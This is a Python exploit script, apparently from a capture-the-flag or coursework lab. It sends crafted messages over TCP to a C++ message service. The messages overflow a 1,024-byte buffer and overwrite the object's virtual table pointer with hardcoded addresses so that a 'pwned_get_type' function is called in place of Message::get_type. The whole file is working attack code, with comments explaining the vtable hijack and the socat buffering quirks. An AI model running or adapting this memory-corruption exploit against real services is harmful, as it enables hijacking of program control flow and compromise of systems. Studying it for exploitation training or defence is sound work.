#!/usr/bin/env python3


import socket
import struct
import sys


MSG_OBJECT_SIZE = 1048
BUFFER_SIZE = 1024

MSG_DATA = 1
MSG_END = 2


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((sys.argv[1], int(sys.argv[2])))
    input("Press any key to send exploit string... ")
    s.sendall(
        # first message
        struct.pack("!H", MSG_DATA) +           # type
        struct.pack("!H", 1020) +               # size
        b"x" * 1020 +                           # data
        # second message
        # We construct a virtual table with pwned_get_type() as a replacement for Message::get_type() and replace the
        # original table. See https://shaharmike.com/cpp/vtable-part1/ and
        # https://www.martinkysel.com/demystifying-virtual-tables-in-c-part-3-virtual-tables/ for details.
        struct.pack("!H", MSG_DATA) +           # type
        struct.pack("!H", MSG_OBJECT_SIZE) +    # size
        # TODO: Base64-encode the following data
        struct.pack("<Q", 0x55555556dec8) +     # pointer to virtual table
        struct.pack("<Q", 0) +                  # 1st pointer in table
        struct.pack("<Q", 0) +                  # 2nd pointer in table
        struct.pack("<Q", 0x5555555562a9) +     # pointer to destructor
        struct.pack("<Q", 0x5555555562a9) +     # pointer to decode()
        struct.pack("<Q", 0x5555555562a9) +     # pointer to get_type()
        b"x" * 972 +                            # to fill the buffer for the 2nd message
        # third message => will terminate loop
        # It seems the message must exceed a certain size, otherwise it will only be delivered to the program after
        # the socket has been closed. This is probably caused by buffering in socat and the C++ standard library.
        struct.pack("!H", MSG_END) +            # type
        struct.pack("!H", 1020) +               # size
        b"x" * 1020                             # data
    )
    input("Press any key to close connection...")
